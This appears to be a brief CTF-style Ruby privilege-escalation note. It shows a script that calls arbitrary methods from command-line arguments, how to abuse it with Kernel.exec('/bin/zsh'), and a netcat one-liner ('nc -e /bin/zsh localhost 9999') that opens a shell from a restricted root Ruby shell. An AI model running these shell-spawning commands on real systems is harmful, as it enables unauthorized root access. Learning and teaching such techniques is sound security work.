# ruby
[https://www.ruby-lang.org](https://www.ruby-lang.org)   [https://rubyfu.net/](https://rubyfu.net/) 

|     |     |
| --- | --- |
| 1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9<br><br>10 | ```text-plain<br>#!/usr/bin/ruby<br><br>require 'rails'<br><br>if ARGV.size == 3<br>    klass = ARGV[0].constantize<br>    obj = klass.send(ARGV[1].to_sym, ARGV[2])<br>else<br>    puts File.read(__FILE__)<br>end<br>``` |

*   Class: `Kernel`
*   class method: `exec()`
*   argument: `/bin/zsh`

use `irb`  to get a ruby command prompt,

for a restricted(special characters blocked) ruby shell, running as root use 

```text-x-ruby
 %x{nc -e /bin/zsh localhost 9999}
```